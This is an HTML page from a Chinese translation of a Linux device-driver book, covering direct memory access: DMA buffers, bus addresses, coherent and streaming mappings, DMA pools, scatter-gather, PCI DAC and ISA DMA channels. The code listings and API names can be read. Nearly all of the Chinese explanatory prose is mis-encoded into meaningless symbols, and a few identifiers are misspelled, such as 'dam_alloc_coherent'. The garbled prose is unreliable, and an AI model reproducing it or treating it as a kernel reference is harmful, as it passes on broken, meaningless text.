<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>15.4.&#160;ֱڴȡ-Linux豸棨İ棩</title>
<meta name="description" content="" />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,,Ƶ" />
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch15.html" title="&#160;15&#160;&#160;ڴӳ DMA ">
<link rel="prev" href="ch15s03.html" title="15.3.&#160;ֱ I/O">
<link rel="next" href="ch15s05.html" title="15.5.&#160;ٲο">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">15.4.&#160;ֱڴȡ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch15s03.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;15&#160;&#160;ڴӳ DMA </th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch15s05.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="DirectMemoryAccess.sect1"></a>15.4.&#160;ֱڴȡ</h2></div></div></div>
<p>ֱڴȡ,  DMA, ǽǵڴĸ߼. DMA ӲֱӴǵ I/O ݵʹڴ, Ҫϵͳ. ֻƵʹܹܴʹһ豸, Ϊļ㿪.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="OverviewofDMADataTransfer.sect2"></a>15.4.1.&#160;һ DMA ݴĸſ</h3></div></div></div>
<p>ڽܳϸ֮ǰ, ǻعһ DMA η, ֻ봫.</p>
<p>ݴ 2 ַ:(ͨһ read)Ӳ첽ݵϵͳ.</p>
<p>ڵһ, Ĳܽ:</p>
<div class="itemizedlist"><ul type="disc">
<li><p>1. һ̵ read, һ DMA 岢ӲݵǸ. ̱Ϊ˯.</p></li>
<li><p>2. Ӳдݵ DMA 岢ʱһж.</p></li>
<li><p>3. жϴ, ȷж, һѽ, ڿԶ.</p></li>
</ul></div>
<p> 2 ǵ DMA 첽ʹ. , ⷢݻȡ豸, û˶ǵʱҲ. , ӦάһںĶܷеۻݸûռ. ഫĲе㲻ͬ:</p>
<div class="itemizedlist"><ul type="disc">
<li><p>1. ӲһжѾ.</p></li>
<li><p>2. жϴһ岢Ҹ֪Ӳﴫ.</p></li>
<li><p>3. дݵ岢һжϵʱ.</p></li>
<li><p>߷, κصĽ, Ҹ.</p></li>
</ul></div>
<p>첽ı峣м. ЩһڴкʹĻλ(Ϊһ DMA Ļ); ÿııڻһõĻ, ҷһж. Ŵ籾ĵںֲڻзһ DMA .</p>
<p>ЩеĴĲ趼ǿ, Ч DMA жϱ. Ȼʵ DMA ʹһѯ, , Ϊһѯ˷ DMA ṩ洦׵ĴI/O.<sup>[<a name="id498425" href="#ftn.id498425">49</a>]</sup></p>
<p>ܵһ DMA . DMA Ҫ豸һʺ DMA Ļ. עǵĻڳʼʱʹֱر -- ֮ǰбеķһ, ˼"һ֮ǰĻ".</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="AllocationgtheDMABuffer.sect2"></a>15.4.2.&#160; DMA </h3></div></div></div>
<p>ں DMA ڵײķ; Ժһ߼ӿ, չʾһ.</p>
<p> DMA Ҫ, Ǵһҳ, ǱռڴҳΪ豸ʹ ISA  PCI ϵͳߴ, Ƕʹַ. עȤƲ SBus (  12 µ"SBus"һ ), ʹַ. һЩϵṹ PCI ʹַ, һֲ.</p>
<p> DMA ɱϵͳʱʱ, ģֻʱǵĻ. ( 8 ½Щ; "ȡ󻺳"һںϵͳʱ, "kmalloc ʵ""get_free_page "ʱ). д߱ķȷڴ, DMA ʱ; ڴǺʵ. ر, һЩϵͳеһЩ豸ϸ߶ڴܲΪ DMA  - ȫ޷ʹø߶˵ַ.</p>
<p>ִϵĴ󲿷豸Դ 32-λ ַ, ˼ڴǸոպõ. һЩ PCI 豸, , ʵ PCI ׼Ҳʹ 32-λ ַ.  ISA 豸, Ȼ, ֻ 24-λ ַ.</p>
<p>Ƶ豸, ڴӦ DMA з, ͨ GFP_DMA ־ kmalloc  get_free_pages . ־, ֻп 24-λ Ѱַڴ汻. һѡ, ʹͨõ DMA (  )仺Խ豸.</p>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Doityourselfallocation.sect3"></a>15.4.2.1.&#160;Լ</h4></div></div></div>
<p>Ѽ get_free_pages ηֱ MByte ( order ֱ MAX_ORDER, ǰ 11), Ǹ߼ʧܵĻԶԶС 128 KB, Ϊϵͳڴʱ䳤˱.<sup>[<a name="id498543" href="#ftn.id498543">50</a>]</sup></p>
<p>ں޷ڴߵҪ 128 KB(, һͨ PCI ֡ץȡ), һ -ENOMEM ʱڴ߱ RAM ĶĻ. ڵ 8 µ "ô" һʱ, ģǲõ.  RAM Ķͨʱһ mem= ںʵֵ. ,  256 MB,  mem=255M ʹں˲ʹö MByte. ģܺʹдöڴĴȡ:</p>
<pre class="programlisting">
dmabuf = ioremap (0xFF00000 /* 255M */, 0x100000 /* 1M */); 
</pre>
<p>, ϱӴһ, ṩһ򵥵 API ̽͹ı RAM ڼϵϱɹʹ. , ɵһڴϵͳʱЧ(, һбʺ CPU ַռڴϵͳ ).</p>
<p>Ȼ, һѡ, ʹ GFP_NOFAIL Ļ. , , ȷʵصضڴϵͳѹ, ðסϵͳķ; Ǳȷʵû.</p>
<p>һ DMA 嵽ĳ, , ֵһķ. 豸ɢ/ I/O, ԷĻԸСƬβ豸. ɢ/ I/O Ҳõֱ I/O ûռʱ, õؽҪһ󻺳ʱ.</p>
</div>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="BusAddresses.sect2"></a>15.4.3.&#160;ߵַ</h3></div></div></div>
<p>һʹ DMA 豸ӵӿߵӲͨѶ, ʹַ, ʹַ.</p>
<p>ʵ, ΢Щ. DMA Ӳʹߵַ, ַ.  ISA  PCI ߵַ PC ȫַ, ÿƽ̨ȴ. ʱӿ߱ͨŽӵ·, ӳ I/O ַַͬ. һЩϵͳһҳӳ, ʹҳ.</p>
<p>ͼ(ٴ, ǽϲ鿴һ߼), Linux ںṩһֲķ, ͨк,  &lt;asm/io.h&gt; . ЩʹòƼ, Ϊֻзǳ򵥵 I/O ϵϵͳ; , ǵʹں˴ʱ.</p>
<pre class="programlisting">
unsigned long virt_to_bus(volatile void *address);
void *bus_to_virt(unsigned long address);
</pre>
<p>Щһ򵥵תں߼ַߵַ֮. ², һ I/O ڴԪ뱻̵ĵط߱ʹ÷ĵط. תȷʹͨõ DMA , תƵ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheGenericDMALayer.sect2"></a>15.4.4.&#160;ͨ DMA </h3></div></div></div>
<p>DMA , , µһ岢Ҵߵַ豸. , дϵϰȫȷ DMA ĿֲҪ. ͬϵͳвͬĸ, ڻһӦιĸ; 㲻ȷ, ƻڴ. һЩϵͳиӵӲ, ʹ DMA  - ߸. Ҳеϵͳڴвֽ DMA. ˵, ںṩһߺϵ DMA ش󲿷Щ. Ƿǳʹ DMA , κд.</p>
<p>ຯҪһָ struct device ָ. ṹ Linux 豸ģ豸ĵͼʾ. ֱʹõĶ, ȷʵҪʹͨ DMA ʱ. , ɷṹ, 豸. ,  struct pci_device  struct usb_device зΪ dev Ա. 豸ṹ 14 ϸ.</p>
<p>ʹ溯Ӧ &lt;linux/dma-mapping.h&gt;.</p>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Dealingwithdifficulthardware.sect3"></a>15.4.4.1.&#160;Ӳ</h4></div></div></div>
<p>ڳ DMA ֮ǰشĵһǸ豸ǷܹڵǰĲ. 豸ܹѰַڴ淶Χ, Ϊ. ȱʡ, ں˼ٶ豸ܹκ 32-λ ַ DMA. , Ӧ֪ͨںʵ, ʹһ:</p>
<pre class="programlisting">
 int dma_set_mask(struct device *dev, u64 mask); 
</pre>
<p>mask Ӧʾ豸ܹѰַλ; Ƶ 24 λ, , Ҫ mask Ϊ 0x0FFFFFF. ֵǷʹø mask  DMA;  dma_set_mask  0, 㲻ܶ豸ʹ  DMA . , 豸еĳʼƵ 24-λ DMA ܿ:</p>
<pre class="programlisting">
if (dma_set_mask (dev, 0xffffff))
        card-&gt;use_dma = 1;
else
{
        card-&gt;use_dma = 0; /* We'll have to live without DMA */
        printk (KERN_WARN, "mydev: DMA not supported\n");
}
</pre>
<p>ٴ, 豸֧, 32-λ DMA , ûбҪ dma_set_mask.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="DMAmappings.sect3"></a>15.4.4.2.&#160;DMA ӳ</h4></div></div></div>
<p>һ DMA ӳǷһ DMA Ͳһ豸ԴȡĵַĽ. ͼʹһ򵥵Ķ virt_to_bus ĵַ, гֵǸ. еĵһǺӲһ IOMMU	ΪṩһӳĴ. IOMMU Ϊκڴ氲豸ɴȡĵַΧ, ʹɢĻ豸. ʹ IOMMU Ҫʹͨõ DMA ; virt_to_bus .</p>
<p>עⲻеϵһ IOMMU; ر, е x86 ƽ̨û IOMMU ֧. һȷдҪ֪֮е I/O ֧Ӳ, .</p>
<p>Ϊ豸һõĵַҲ, ĳЩ, ҪһĽ. ǵһͼһ費ܴﵽĵַϽ DMA ʱ, һڴַ. ݽŸҪʹӷ. ˵, ʹ, ʱûѡ.</p>
<p>DMA ӳҲһ. סִȡڴĿһٵıػ; û, ǲܵ. 豸ıһ, ǿʹκΰǸĴ汻ʧЧ; ʹòȷӳ, ҵƻ. Ƶ, 豸ʹ DMA жȡ, κζǸפڴڴĸıȱˢ. ЩһԲͷģѰĴ, ߲С. һϵӲйһ, Ҫ֧. ͨõ DMA ֤ܶϵ鶼ȷ, , ͬǽ, ȷΪҪһЩ.</p>
<p>DMA ӳһ, dma_addr_t, ߵַ.  dma_addr_t ıӦ͸; ΨһĲǴǵ DMA ֹ֧̺豸. Ϊһߵַ, dma_addr_t ɵ² CPU ֱʹ.</p>
<p>PCI  2  DMA ӳԲͬ,  DMA 屻ͣ೤ʱ:</p>
Coherent DMA mappings 
<p> DMA ӳ. Щӳ䳣ڴ. һĻͬʱ CPU (ӳ, ֮ͬ󽫿, κθʱֻһһ). , һµӳڻһµڴ. һµӳ佨ʹÿǰ.</p>
Streaming DMA mappings 
<p> DMA ӳ. ӳ䳣Ϊһ. һЩϵʹӳʱŻ, , ЩӳҲһϸĹδȡǵĹ. ں˿߽ʹһӳӳκοܵʱ.  2 ԭ. һ, ֧ӳĴϵͳ, ÿ DMA ӳʹһ. һӳ, г, ԳʱռЩĴ, ǲʹʱ. һԭ, ĳЩӲ, ӳ޷һӳʹõķŻ.</p>
<p> 2 ӳͱԲͬķʽ; ʱ򿴿ϸ.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="SettingupcoherentDMAmappings.sect3"></a>15.4.4.3.&#160;һ DMA ӳ</h4></div></div></div>
<p>һԽһһӳ, ʹö dma_alloc_coherent ĵ:</p>
<pre class="programlisting">
void *dma_alloc_coherent(struct device *dev, size_t size, dma_addr_t *dma_handle, int flag);
</pre>
<p>ķӳ. ǰ 2 豸ҪĻС.  DMA ӳĽ 2 ط. ķֵǻһںַ, ɱʹ; صߵַ dma_handle з. б屻һʹ DMA λ; ڴֻʹ get_free_pages (עСֽڼƵ, һ order ֵ). flag ͨ GFP_ ֵڴα; Ӧ GFP_KERNEL ()  GFP_ATOMIC (ԭʱ).</p>
<p>Ҫ(ģжʱ), Ӧظϵͳ, ʹ dma_free_coherent:</p>
<pre class="programlisting">
void dma_free_coherent(struct device *dev, size_t size,
 void *vaddr, dma_addr_t dma_handle);
</pre>
<p>ע, ͨ DMA , ҪṩеĴС, CPU ַ,  ߵַ.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="DMApools.sect3"></a>15.4.4.4.&#160;DMA </h4></div></div></div>
<p>һ DMA ǷС, һDMAӳķ.  dma_alloc_coherent õӳһҳСС. ҪǸС DMA , Ӧʹһ DMA . DMA Ҳ, ͼǶһṹеС DMA . һЩǳģѱ׷ٵһ, ڿС DMA ĽṹԱ. Ϊ, Ӧһֱȷ DMA , ķ DMA ݽṹֿ.</p>
<p>DMA غ &lt;linux/dmapool.h&gt;.</p>
<p>һ DMA رʹǰ, ʹһ:</p>
<pre class="programlisting">
struct dma_pool *dma_pool_create(const char *name, struct device *dev,
 size_t size, size_t align,
 size_t allocation); 
</pre>
<p>, name ǳص, dev 豸ṹ, size ҪطĻС, align ԳصķҪӲ(ֽڱ), Լ allocation, , һ䲻ӦԽڴ߽.  allocation  4096 , , ӳطĻ岻Խ 4-KB ߽.</p>
<p>һ, ɱͷ, :</p>
<pre class="programlisting">
void dma_pool_destroy(struct dma_pool *pool); 
</pre>
<p>Ӧеķ, ֮ǰ. 䱻 dma_pool_alloc :</p>
<pre class="programlisting">
void *dma_pool_alloc(struct dma_pool *pool, int mem_flags, dma_addr_t *handle);
</pre>
<p>, mem_flags ǳõ GFP_ ־. ж˳, һڴ(Сǵشʱָ)ͷ.  dam_alloc_coherent,  DMA ַΪһںַ, Ϊһߵַ handle.</p>
<p>ҪĻӦس, ʹ:</p>
<pre class="programlisting">
void dma_pool_free(struct dma_pool *pool, void *vaddr, dma_addr_t addr); 
</pre>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="SettingupstreamingDMAmapping.sect3"></a>15.4.4.5.&#160; DMA ӳ</h4></div></div></div>
<p>ӳһӳиӵĽӿ, мԭ. ЩӳΪʹһѾĻ, , 봦ûѡĵַ. һЩϵ, ӳҲжҳͶಿֵ"ɢ/". Щԭ, ӳԼһӳ亯.</p>
<p>һӳʱ, ֪ںĸ. һЩ(enum dam_data_direction )Ϊ˶:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>DMA_TO_DEVICE</span></span></dt>
<dd></dd>
<dt><span class="term"><span>DMA_FROM_DEVICE </span></span></dt>
<dd><p> 2 ӦԽ͵. ݱ豸(Ӧ, Ҳ, һ write ϵͳ), DMA_IO_DEVICE Ӧʹ; ȥ CPU , ෴,  DMA_FROM_DEVICE ־.</p></dd>
<dt><span class="term"><span>DMA_BIDIRECTIONAL </span></span></dt>
<dd><p>ݱһƶ, ʹ DMA_BIDIRECTIONAL.</p></dd>
<dt><span class="term"><span>DMA_NONE </span></span></dt>
<dd><p>ֻΪһԸṩ. ͼʹôĻ嵼ں˱.</p></dd>
</dl></div>
<p>ʱͼֻʹ DMA_BIDIRECTIONAL, Ӧֵסջ. һЩϵ, ѡʧ.</p>
<p>еҪ, ʹ dma_map_single ӳ:</p>
<pre class="programlisting">
dma_addr_t dma_map_single(struct device *dev, void *buffer, size_t size, enum dma_data_direction direction);
</pre>
<p>ֵߵַ, Դݵ豸,  NULL д.</p>
<p>һ, ӳӦ dma_unmap_single ɾ:</p>
<pre class="programlisting">
void dma_unmap_single(struct device *dev, dma_addr_t dma_addr, size_t size, enum dma_data_direction direction);
</pre>
<p>, size  direction ƥЩӳ仺.</p>
<p>һЩҪĹ DMA ӳ:</p>
<div class="itemizedlist"><ul type="disc">
<li><p>ֻƥӳʱķĴ.</p></li>
<li><p>һһѱӳ, 豸, Ǵ. ֱѱȥӳ, Ӧκηʽ. ֻڵ dma_unmap_single ſɰȫȡ(һ, ϼ). , һڱд豸Ļ岻ܱӳ, ֱеҪд.</p></li>
<li><p>벻ӳ,  DMA Ȼ, ϶صϵͳȶ.</p></li>
</ul></div>
<p>ΪʲôһһѱӳͲʹ. Ϊʲôʵ 2 ԭ. һ, һΪ DMA ӳ, ں˱ȷееʵѱдڴ. пһЩڴĻ浱 dma_unmap_single ʱ, ұ뱻ȷˢ. ˢºд뻺ݿܶ豸ɼ.</p>
<p>ڶ, һ»ᷢʲô, ӳĻһ豸ɴȡڴ. һЩϵȫʧ, Ĵһ. ֻһֿڴ, 豸ɴȡ. һ屻ӳʹ DMA_TO_DEVICE , Ҫһ, ԭʼΪӳһֱ. Ե, ڿĶԭʼĸı豸. Ƶ, DMA_FROM_DEVICE 屻 dma_unmap_single صԭʼ; 豸ֱɲų.</p>
<p>żȻ, ΪʲôȷҪ, һԭ. DMA_BIDIRECTIONAL ڲǰ󱻿, ⳣһ CPU ڵĲҪ˷.</p>
<p>żһҪȡһ DMA ݶӳ. ṩһ:</p>
<pre class="programlisting">
void dma_sync_single_for_cpu(struct device *dev, dma_handle_t bus_addr, size_t size, enum dma_data_direction direction); 
</pre>
<p>Ӧڴȡһ DMA ǰ. һ, CPU "ӵ" DMA 岢ҿ԰ʹ. 豸ȡǰ, , ӵȨӦݻظ, ʹ:</p>
<pre class="programlisting">
void dma_sync_single_for_device(struct device *dev, dma_handle_t bus_addr, size_t size, enum dma_data_direction direction); 
</pre>
<p>, һ, ڵ֮Ӧȡ DMA .</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Singlepagestreamingmappings.sect3"></a>15.4.4.6.&#160;ҳӳ</h4></div></div></div>
<p>żȻ, 뽨һӳ, һ struct page ָ; , ܷʹ get_user_pages ӳû. Ϊȡӳʹ struct page ָ, ʹ:</p>
<pre class="programlisting">
dma_addr_t dma_map_page(struct device *dev, struct page *page,
 unsigned long offset, size_t size,
 enum dma_data_direction direction); 
void dma_unmap_page(struct device *dev, dma_addr_t dma_address,
 size_t size, enum dma_data_direction direction);
</pre>
<p>offset  size ɱӳҳĲ. , 鲿ҳӳӦ, ȷʲô. ӳһҳĲֿܵ»һ, ֻһߵһ; , ֮, ᵼڴƻصԵԵĴ.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Scattergathermapping.sect3"></a>15.4.4.7.&#160;ɢ/ӳ</h4></div></div></div>
<p>ɢ/ӳһ͵ DMA ӳ. м, Ҫݵߴ豸. Լʽ, һ readv  writev ϵͳ, һɴصĴ I/O , һҳһӳں I/O . ɼ򵥵ӳÿ, , ҽҪĲ, мŵһӳ.</p>
<p>豸Խһɢָͳ, Ҵȫһ DMA ; , "㿽"ǸڶƬн. һӳ䷢ɢбΪһӲӳĴϵͳ. ϵͳ, ϲҳ豸Ĺ۵㿴ɱ㼯Ϊһ, . ֻɢеڳϵҳС(˵һһ), ǵʱ, תһ DMA, Եļ.</p>
<p>, һ뱻ʹ, ӦбΪһ(Ϊڱκηʽ).</p>
<p>ȷɢӳĳЩֵõ. ӳһɢĵһǴһ struct scatterlist , Ļ. ṹϵ,  &lt;asm/scatterlist.h&gt; . ,  3 Ա:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>struct page *page;</span></span></dt>
<dd><p>struct page ָ, Ӧڷɢ/۲ʹõĻ.</p></dd>
<dt><span class="term"><span>unsigned int length;</span></span></dt>
<dd></dd>
<dt><span class="term"><span>unsigned int offset;</span></span></dt>
<dd><p>ĳȺҳƫ.</p></dd>
</dl></div>
<p>Ϊӳһɢ/ DMA , Ӧ page, offset,  length Աһ struct scatterlist ÿҪ͵Ļ. ŵ:</p>
<pre class="programlisting">
int dma_map_sg(struct device *dev, struct scatterlist *sg, int nents, enum dma_data_direction direction)
</pre>
<p> nents ǴɢĿ. ֵҪ͵ DMA Ŀ. С nents.</p>
<p>ɢеÿ, dma_map_sg ȷĸ豸ߵַ. Ϊһ, ҲڴĻ. еϵͳһ I/O ڴԪ, dma_map_sg ҲԪӳĴ, ܵĽ, Ĺ۵, ܹһ, Ļ. 㽫֪͵Ľ, , ֱڵ֮.</p>
<p>Ӧ pci_map_sg صÿ. ߵַÿĳȴ洢 struct scatterlist , ڽṹеλÿϵͬ. 2 궨ѱʹÿܱдֲĴ:</p>
<pre class="programlisting">
dma_addr_t sg_dma_address(struct scatterlist *sg); 
</pre>
<p>ɢڷ(	DMA )ַ.</p>
<pre class="programlisting">
unsigned int sg_dma_len(struct scatterlist *sg); 
</pre>
<p>ĳ.</p>
<p>ٴ, סҪ͵Ļĵַͳȿܺʹݸ dma_map_sg Ĳͬ.</p>
<p>һ, һ ɢ/ ӳ䱻ʹ dma_unmap_sg ȥӳ:</p>
<pre class="programlisting">
void dma_unmap_sg(struct device *dev, struct scatterlist *list, int nents, enum dma_data_direction direction);
</pre>
<p>ע nents ݸ dma_map_sg Ŀ, Ҳظ DMA Ŀ.</p>
<p>ɢ/ӳ DMA ӳ, ͬĴȡͬһӳһ. ȡһӳķɢ/б, ͬ:</p>
<pre class="programlisting">
void dma_sync_sg_for_cpu(struct device *dev, struct scatterlist *sg,
 int nents, enum dma_data_direction direction);
void dma_sync_sg_for_device(struct device *dev, struct scatterlist *sg, 
 int nents, enum dma_data_direction direction); 
</pre>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="PCIdoubleaddresscyclemapping.sect3"></a>15.4.4.8.&#160;PCI ˫ַӳ</h4></div></div></div>
<p>, DMA ֲ֧ʹ 32-λ ߵַ, һض豸 DMA . PCI , , Ҳ֧һ 64-λַģʽ, ˫ַ(DAC). ͨ DMA 㲻֧ģʽ, Ϊ, һһ PCI-ض . ,  DAC ʵǴ, , Ϊ DAC һ, 32-λ DMA, һܿ. , еӦóʹ DAC ȷ; һ豸ʹ÷ǳλڸڴĻ, Ҫʵ DAC ֧. ֻ֧ PCI ,  PCI-ضĺ뱻ʹ.</p>
<p>Ϊʹ DAC,  &lt;linux/pci.h&gt;. һ DMA :</p>
<pre class="programlisting">
int pci_dac_set_dma_mask(struct pci_dev *pdev, u64 mask);
</pre>
<p>ʹ DAC Ѱַֻ÷ 0 ʱ. һ (dma64_addr_t)  DAC ӳ. ΪһЩӳ,  pci_dac_page_to_dma:</p>
<pre class="programlisting">
dma64_addr_t pci_dac_page_to_dma(struct pci_dev *pdev, struct page *page, unsigned long offset, int direction);
</pre>
<p>DAC ӳ, 㽫ע⵽, ֻܱ struct page ָ(Ӧλڸڴ, Ͼ, ʹû); Ǳһһҳر. direction ͨ DMA ʹõ enum dma_data_direction  PCI Ե; Ӧ PCI_DMA_TODEVICE, PCI_DMA_FROMDEVICE,  PCI_DMA_BIRDIRECTIONAL.</p>
<p>DAC ӳ䲻ҪⲿԴ, ʹúûбҪȷͷ. , бҪԴӳһԴ DAC ӳ, عڻȨĹ. һ׺ͬ DMA , ͨı:</p>
<pre class="programlisting">
void pci_dac_dma_sync_single_for_cpu(struct pci_dev *pdev,
 dma64_addr_t dma_addr,
 size_t len,
 int direction); 

void pci_dac_dma_sync_single_for_device(struct pci_dev *pdev,
 dma64_addr_t dma_addr,
 size_t len,
 int direction);
</pre>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="AsimplePCIDMAexample.sect3"></a>15.4.4.9.&#160;һ򵥵 PCI DMA </h4></div></div></div>
<p>Ϊһ DMA ӳαʹõ, չʾһ򵥵ĸһ PCI 豸 DMA .  PCI ϵݵ DMA ʽǳ豸. , Ӳκʵ豸; ෴, һΪ dad ( DMA Acquisiton Device) ļһ. һ豸ܶһͺ:</p>
<pre class="programlisting">
int dad_transfer(struct dad_dev *dev, int write, void *buffer,
 size_t count)
{
 dma_addr_t bus_addr;

 /* Map the buffer for DMA */
 dev-&gt;dma_dir = (write ? DMA_TO_DEVICE : DMA_FROM_DEVICE);
 dev-&gt;dma_size = count;
 bus_addr = dma_map_single(&amp;dev-&gt;pci_dev-&gt;dev, buffer, count,

 dev-&gt;dma_dir);
 dev-&gt;dma_addr = bus_addr;

 /* Set up the device */
 writeb(dev-&gt;registers.command, DAD_CMD_DISABLEDMA);
 writeb(dev-&gt;registers.command, write ? DAD_CMD_WR : DAD_CMD_RD);
 writel(dev-&gt;registers.addr, cpu_to_le32(bus_addr));
 writel(dev-&gt;registers.len, cpu_to_le32(count));

 /* Start the operation */
 writeb(dev-&gt;registers.command, DAD_CMD_ENABLEDMA);
 return 0;

} 
</pre>
<p>ӳҪ͵Ļ岢豸. һжϷ, :</p>
<pre class="programlisting">
void dad_interrupt(int irq, void *dev_id, struct pt_regs *regs)
{
 struct dad_dev *dev = (struct dad_dev *) dev_id;

 /* Make sure it's really our device interrupting */
 /* Unmap the DMA buffer */
 dma_unmap_single(dev-&gt;pci_dev-&gt;dev, dev-&gt;dma_addr,
 dev-&gt;dma_size, dev-&gt;dma_dir);

 /* Only now is it safe to access the buffer, copy to user, etc. */
 ...
}
</pre>
<p>Ȼ, ȱϸ, Ҫκβֹͬʱ DMA .</p>
</div>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="DMAforISADevices.sect2"></a>15.4.5.&#160;ISA 豸 DMA</h3></div></div></div>
<p>ISA  2  DMA :  DMA  ISA  DMA.  DMA ʹϵı׼ DMA-· ISA ϵź. ISA  DMA, һ, ȫ账, ٴĹ۵㿴. һ ISA  1542 SCSI , ںԴ drivers/scsi/aha1542.c.</p>
<p>ڱ DMA,  3 ʵ ISA ϵ DMA ݴ.</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>The 8237 DMA controller (DMAC) </span></span></dt>
<dd><p>й DMA ͵Ϣ, 緽, ڴַ, Լ͵ĴС. һٽеĴ͵״̬. յһ DMA ź, ߵĿȨźԱ豸ɶЩ.</p></dd>
<dt><span class="term"><span>The peripheral device </span></span></dt>
<dd><p>豸뼤 DMA ߵ׼ʱ. ʵʵĴ DMAC ; Ӳ豸˳дݵߵ̽豸ʱ. 豸жϵͽʱ.</p></dd>
<dt><span class="term"><span>The device driver </span></span></dt>
<dd><p>ʲô; ṩ DMA , ߵַ,ʹ͵ĴС. ͨѶ׼ݺӦжϵ DMA ʱ.</p></dd>
</dl></div>
<p>ʼ PC ʹõ DMA  4 "ͨ", ÿһ DMA Ĵ. 4 豸ͬʱ洢ǵ DMA Ϣڿ. µ PC ͬ 2  DMAC 豸<sup>[<a name="id500013" href="#ftn.id500013">51</a>]</sup>:  2 ()ӵϵͳĴ, ҵ 1 ()ӵ 2 ͨ 0.</p>
<p> PC ֻһ;  2 ڻ 286 ƽ̨ӵ. ,  2 ͬһ, Ϊ 16-λĴ;  1 ֻ 8 λÿβΪݶ.</p>
<p>ͨıŴ 0  7: ͨ 4  ISA 費, Ϊڲӿ. , õͨ 0  3 ڴӿ( 8-λ ͨ)  5  7 ( 16-λͨ). κ DMA ͵ĴС, 洢ڿ, һڵĿ 16-λ. ĴʹС, , 64KB ڴӿ(Ϊ 8 λһ) 128KB (  16-λ ).</p>
<p>Ϊ DMA һϵͳΧԴ, ں˰. ʹһ DMA עṩһͷŻƸ DMA ͨ, һ׺ DMA ͨϢ.</p>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="RegisteringDMAusage.sect3"></a>15.4.5.1.&#160;ע DMA ʹ</h4></div></div></div>
<p>ӦϤںע -- Ѿ I/O ˿ںж. DMA ͨע.  &lt;asm/dma.h&gt; Ѿ, ĺúͷһ DMA ͨӵȨ:</p>
<pre class="programlisting">
int request_dma(unsigned int channel, const char *name); 
void free_dma(unsigned int channel);
</pre>
<p>ͨһ 0  7 ֮, ȷЩ, һС MAX_DMA_CHANNELS ֵ.  PC , MAX_DMA_CHANNELS Ϊ 8 ƥӲ. name һַʶ豸. ض name ļ /proc/dma, ɱû.</p>
<p> request_dma ķֵ 0 ڳɹ,  -EINVAL  -EBUSY д. ǰ˼ͨΧ, ˼һ豸ͨ.</p>
<p>ƼԴ I/O ˿ںжһСĶԴ DMA ͨ; ڴʱͨڴģʼ. Ӻ֮һЩ; , ģ I/O ӿڿԹ DMA ֻͨҪǲͬʱʹ.</p>
<p>ǻ DMA ͨж֮жǰͷ. ǹõ˳ 2 Դ; ѭĿ. עÿʹ DMA 豸Ҫһ IRQ ; , ָʾݴ͵.</p>
<p>һ͵, open 뿴, ǵļ dad ģ. dad 豸ʹһжϴ,  IRQ ֧.</p>
<pre class="programlisting">
int dad_open (struct inode *inode, struct file *filp)
{

 struct dad_device *my_device; 

/* ... */
 if ( (error = request_irq(my_device.irq, dad_interrupt,
 SA_INTERRUPT, "dad", NULL)) )
 return error; /* or implement blocking open */

 if ( (error = request_dma(my_device.dma, "dad")) ) {
 free_irq(my_device.irq, NULL);
 return error; /* or implement blocking open */
 }

 /* ... */
 return 0; 
} 
</pre>
<p> open ƥ close ʵֿ:</p>
<pre class="programlisting">
void dad_close (struct inode *inode, struct file *filp)
{

 struct dad_device *my_device;
 /* ... */
 free_dma(my_device.dma);
 free_irq(my_device.irq, NULL);
 /* ... */ 
} 
</pre>
<p> /proc/dma ļ һװϵͳе:</p>
<pre class="screen">
merlino% cat /proc/dma
 1: Sound Blaster8
 4: cascade
</pre>
<p>ע, ȱʡ DMA ͨϵͳʱҴӲͷ. һռλ, ָͨ 4 , ͬǰ͵.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="TalkingtotheDMAcontroller.sect3"></a>15.4.5.2.&#160; DMA ͨѶ</h4></div></div></div>
<p>ע, Ҫְ DMA ȷ. 񲢷΢, ˵, ں˵Ҫеĺ.</p>
